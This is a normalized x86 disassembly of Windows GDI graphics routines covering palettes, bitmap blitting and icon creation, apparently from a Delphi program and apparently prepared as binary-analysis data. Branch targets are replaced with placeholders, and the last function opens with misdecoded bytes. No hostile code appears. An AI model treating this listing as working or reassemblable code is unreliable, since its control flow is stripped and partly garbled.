mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push sub_440328
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41d824
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41da9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406894
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc4f
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41dc5c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41dc94
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c64
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41dd0c
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41dd64
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41de61
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de68
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41de7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41df02
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41df14
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41dd0c
mov eax esp
call sub_41de7c
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41dfb8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41dd0c
mov [ esp ] eax
sub_41e00c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41d9b4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41d994
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e1b8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e0de
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41d834
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e0e5
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41d728
sub_41e0e5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41d9b4
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41d824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e198
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41d834
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e19f
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e1d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e264
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079e8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41e55b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41e34d
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41d728
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e354
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e354
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e1c8
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_4079e8
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41e53b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e00c
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4079e8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41e518
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e51f
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41d77c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e1c8
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e1d4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41e56c
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41d710
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c64
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41d9b4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41e650
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41e56c
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41e6bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41e56c
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e759
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e760
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41e790
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c64
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c64
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41e784
xor edx edx
push ebp
push sub_41e97e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41e650
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41e650
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41e957
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_4079e8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_4079e8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_4079e8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_4079e8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41e6bc
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41e6bc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e95e
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41e95e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e985
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41e98c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41e9dc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41ea34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41e9dc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ea7d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031a0
mov edi eax
mov eax esi
call sub_4031a0
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
